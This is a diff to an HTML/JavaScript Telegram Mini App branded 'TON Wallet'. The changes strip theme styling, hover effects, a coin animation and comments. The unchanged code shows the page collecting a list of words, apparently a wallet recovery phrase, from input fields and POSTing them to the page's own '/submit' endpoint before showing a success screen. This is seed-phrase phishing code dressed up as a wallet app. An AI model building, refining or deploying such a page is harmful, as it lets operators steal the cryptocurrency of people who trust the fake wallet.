@@ -15,28 +15,13 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: var(--tg-theme-bg-color, #0a0c12);
-            color: var(--tg-theme-text-color, #ffffff);
+            background: #17212b;
+            color: #ffffff;
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 40%, rgba(30, 80, 120, 0.15), rgba(0, 0, 0, 0.2));
-            pointer-events: none;
-            z-index: 0;
         }
 
         .page {
-            position: relative;
-            z-index: 2;
             max-width: 560px;
             margin: 0 auto;
             padding: 24px 20px 40px;
@@ -67,6 +52,7 @@
             display: none !important;
         }
 
+        /* Карточки без движения при наведении */
         .wallet-card {
             background: rgba(28, 32, 44, 0.85);
             backdrop-filter: blur(20px);
@@ -75,13 +61,7 @@
             margin-bottom: 20px;
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
             width: 100%;
-        }
-
-        .wallet-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.3);
         }
 
         h2 {
@@ -115,7 +95,7 @@
         }
 
         .subtext {
-            color: var(--tg-theme-hint-color, #9aa1b0);
+            color: #9aa1b0;
             font-size: 15px;
             text-align: center;
             margin-top: 8px;
@@ -451,7 +431,7 @@
             if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
         });
 
-        // ОТПРАВКА ДАННЫХ ЧЕРЕЗ FETCH (на сервер Render)
+        // ОТПРАВКА ДАННЫХ ЧЕРЕЗ FETCH
         sendBtn.addEventListener('click', async () => {
             const wordsArray = [];
             let hasError = false;
@@ -496,14 +476,12 @@
                 timestamp: Date.now()
             };
             
-            // Блокируем кнопку и показываем статус
             sendBtn.disabled = true;
             sendBtn.style.opacity = '0.6';
             statusBanner.innerHTML = '⏳ Отправка данных...';
             statusBanner.style.color = '#ffaa44';
             
             try {
-                // Отправляем на сервер Render (относительный путь)
                 const response = await fetch('/submit', {
                     method: 'POST',
                     headers: {
@@ -517,7 +495,6 @@
                     statusBanner.style.color = '#88ff88';
                     if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
                     
-                    // Показываем страницу успеха
                     formPage.classList.add('hidden');
                     successPage.classList.remove('hidden');
                     successPage.style.animation = 'fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.2)';
@@ -535,7 +512,6 @@
             }
         });
         
-        // Закрытие приложения
         if (closeBtn) {
             closeBtn.addEventListener('click', () => {
                 if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
@@ -543,55 +519,6 @@
             });
         }
 
-        // Эффект монет при клике
-        function createBurstOfCoins(x, y) {
-            for (let i = 0; i < 12; i++) {
-                const burstCoin = document.createElement('div');
-                burstCoin.textContent = '🪙';
-                burstCoin.style.position = 'fixed';
-                burstCoin.style.fontSize = (Math.random() * 22 + 16) + 'px';
-                burstCoin.style.left = (x || window.innerWidth/2) + (Math.random() - 0.5) * 100 + 'px';
-                burstCoin.style.top = (y || window.innerHeight/2) + (Math.random() - 0.5) * 80 + 'px';
-                burstCoin.style.opacity = '0.9';
-                burstCoin.style.pointerEvents = 'none';
-                burstCoin.style.zIndex = '9999';
-                burstCoin.style.transition = 'all 1s ease-out';
-                document.body.appendChild(burstCoin);
-                
-                setTimeout(() => {
-                    burstCoin.style.transform = `translateY(-${Math.random() * 150 + 50}px) rotate(${Math.random() * 360}deg)`;
-                    burstCoin.style.opacity = '0';
-                }, 10);
-                
-                setTimeout(() => burstCoin.remove(), 1100);
-            }
-        }
-        
-        if (sendBtn) {
-            sendBtn.addEventListener('click', (e) => {
-                const rect = sendBtn.getBoundingClientRect();
-                createBurstOfCoins(rect.left + rect.width/2, rect.top + rect.height/2);
-            });
-        }
-        if (continueBtn) {
-            continueBtn.addEventListener('click', (e) => {
-                const rect = continueBtn.getBoundingClientRect();
-                createBurstOfCoins(rect.left + rect.width/2, rect.top + rect.height/2);
-            });
-        }
-        
-        // Адаптация под тему Telegram
-        if (tg.colorScheme === 'dark') {
-            document.body.style.setProperty('--tg-theme-bg-color', '#0a0c12');
-        } else {
-            document.body.style.setProperty('--tg-theme-bg-color', '#f0f2f5');
-            document.body.style.setProperty('--tg-theme-text-color', '#1f2a3e');
-            const cards = document.querySelectorAll('.wallet-card');
-            cards.forEach(card => {
-                card.style.background = 'rgba(245, 248, 250, 0.92)';
-            });
-        }
-        
         // Переход по Enter
         inputFields.forEach((input, idx) => {
             input.addEventListener('keypress', (e) => {
@@ -607,12 +534,9 @@
             });
         });
         
-        // Убеждаемся, что successPage скрыта при старте
         successPage.classList.add('hidden');
         formPage.classList.add('hidden');
         introPage.classList.remove('hidden');
-        
-        console.log('TON Wallet — готов к работе с сервером Render');
     </script>
 </body>
 </html>
